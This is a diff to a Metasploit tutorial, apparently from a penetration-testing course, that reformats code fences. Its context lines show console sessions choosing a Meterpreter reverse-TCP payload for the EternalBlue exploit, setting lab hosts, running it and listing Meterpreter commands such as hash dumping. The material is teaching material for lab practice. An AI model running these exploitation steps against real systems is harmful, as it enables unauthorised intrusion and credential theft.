@@ -43,8 +43,7 @@ The scope of this payload, as with any others, besides granting shell access to 
 
 #### MSF - Staged Payloads
 
-```
-        shellsession
+```shellsession
 msf6 > show payloads
 
 <SNIP>
@@ -89,8 +88,7 @@ As mentioned above, Meterpreter payloads offer us a significant amount of flexib
 
 #### MSF - List Payloads
 
-```
-        shellsession
+```shellsession
 msf6 > show payloads
 
 Payloads
@@ -126,8 +124,7 @@ As seen above, there are a lot of available payloads to choose from. Not only th
 
 Scrolling through the list above, we find the section containing `Meterpreter Payloads for Windows(x64)`.
 
-```
-        shellsession
+```shellsession
    515  windows/x64/meterpreter/bind_ipv6_tcp                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
    516  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
    517  windows/x64/meterpreter/bind_named_pipe                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
@@ -156,8 +153,7 @@ We have to enter the `grep` command with the corresponding parameter at the begi
 
 #### MSF - Searching for Specific Payload
 
-```
-        shellsession
+```shellsession
 msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads
 
    6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
@@ -182,8 +178,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter show payloa
 
 This gives us a total of `14` results. Now we can add another `grep` command after the first one and search for `reverse_tcp`.
 
-```
-        shellsession
+```shellsession
 msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
 
    15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
@@ -206,8 +201,7 @@ Same as with the module, we need the index number of the entry we would like to 
 
 #### MSF - Select Payload
 
-```
-        shellsession
+```shellsession
 msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
 
 Module options (exploit/windows/smb/ms17_010_eternalblue):
@@ -241,8 +235,7 @@ payload => windows/x64/meterpreter/reverse_tcp
 
 After selecting a payload, we will have more options available to us.
 
-```
-        shellsession
+```shellsession
 msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
 
 Module options (exploit/windows/smb/ms17_010_eternalblue):
@@ -298,8 +291,7 @@ If we want to check our LHOST IP address quickly, we can always call the `ifconf
 
 #### MSF - Exploit and Payload Configuration
 
-```
-        shellsession
+```shellsession
 msf6 exploit(**windows/smb/ms17_010_eternalblue**) > ifconfig
 
 **[\*]** exec: ifconfig
@@ -323,8 +315,7 @@ RHOSTS => 10.10.10.40
 
 Then, we can run the exploit and see what it returns. Check out the differences in the output below:
 
-```
-        shellsession
+```shellsession
 msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 
 [*] Started reverse TCP handler on 10.10.14.15:4444 
@@ -369,8 +360,7 @@ The prompt is not a Windows command-line one but a `Meterpreter` prompt. The `wh
 
 #### MSF - Meterpreter Commands
 
-```
-        shellsession
+```shellsession
 meterpreter > help
 
 Core Commands
@@ -543,8 +533,7 @@ Pretty nifty. From extracting user hashes from SAM to taking screenshots and act
 
 #### MSF - Meterpreter Navigation
 
-```
-        shellsession
+```shellsession
 meterpreter > cd Users
 meterpreter > ls
 
@@ -578,8 +567,7 @@ Moving into a standard shell on the target is helpful in some cases, but Meterpr
 
 #### MSF - Windows CMD
 
-```
-        shellsession
+```shellsession
 Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation. All rights reserved.
 
